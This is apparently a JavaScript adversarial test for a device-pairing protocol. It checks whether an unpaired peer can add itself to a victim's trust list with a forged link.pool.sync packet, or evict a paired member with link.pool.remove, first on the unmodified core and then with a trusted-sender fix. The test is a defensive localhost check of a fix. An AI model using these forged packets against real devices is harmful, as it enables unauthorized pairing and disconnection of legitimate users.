// Adversarial check: can an UNPAIRED device that merely opens a TLS connection to port 1739
// (a) get itself trusted by sending link.pool.sync, or (b) evict a member via link.pool.remove?
// Run twice: unmodified Link core, then with the trusted-sender rule applied.
const L = require('./linkcore.js');
const fs = require('fs');
const path = require('path');
const { loadCert } = require('./common');
const { applyTrustedSenderRule } = require('./fixes');
console.log = () => {}; console.warn = () => {}; console.error = () => {};
const out = (...a) => process.stdout.write(a.join(' ') + '\n');
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let port = 24000;

function node(i, dir) {
  const c = loadCert(i);
  const d = path.join(dir, 'n' + i); fs.mkdirSync(d, { recursive: true });
  const ts = new L.TrustStore(d);
  const dm = new L.DeviceManager({ cert: c.cert, key: c.key, myIdentity: { deviceId: c.id, deviceName: 'n' + i, deviceType: 'desktop', protocolVersion: 1, incomingCapabilities: [], outgoingCapabilities: [] } }, ts, port++);
  return { id: c.id, cert: c.cert, ts, dm, port: port - 1 };
}

async function trial(label) {
  const dir = fs.mkdtempSync('/dev/shm/attack-');
  const victim = node(0, dir), member = node(1, dir), attacker = node(9, dir);
  victim.ts.pair({ deviceId: member.id, deviceName: 'member', certPem: member.cert, protocolVersion: 1, pairedAt: 0 });
  member.ts.pair({ deviceId: victim.id, deviceName: 'victim', certPem: victim.cert, protocolVersion: 1, pairedAt: 0 });
  await member.dm.connectTo('127.0.0.1', victim.port);
  await attacker.dm.connectTo('127.0.0.1', victim.port);
  await sleep(300);
  const conn = attacker.dm.peers.get(victim.id).conn;
  // (a) self-enrollment: advertise our own identity and genuine certificate in a forged trust list
  conn.send(L.createPacket('link.pool.sync', { trustList: [{ deviceId: attacker.id, deviceName: 'attacker', certPem: attacker.cert, protocolVersion: 1 }] }));
  await sleep(300);
  const enrolled = victim.ts.isPaired(attacker.id);
  const trustedLink = victim.dm.hasTrustedPeer(attacker.id);
  // (b) eviction: ask the victim to drop a legitimate member
  conn.send(L.createPacket('link.pool.remove', { deviceId: member.id }));
  await sleep(300);
  const evicted = !victim.ts.isPaired(member.id);
  out(`${label}: attacker enrolled=${enrolled} trusted-link=${trustedLink} | member evicted=${evicted}`);
  for (const x of [victim, member, attacker]) { try { x.dm.server.close(); } catch {} for (const p of x.dm.peers.values()) p.conn.close(); }
  await sleep(200);
  fs.rmSync(dir, { recursive: true, force: true });
  return { enrolled, trustedLink, evicted };
}

(async () => {
  const res = {};
  res.unmodified = await trial('unmodified core');
  applyTrustedSenderRule(L);
  res.patched = await trial('trusted-sender rule');
  fs.mkdirSync(path.join(__dirname, 'results'), { recursive: true });
  fs.writeFileSync(path.join(__dirname, 'results', 'attack.json'), JSON.stringify(res, null, 2));
  process.exit(0);
})();
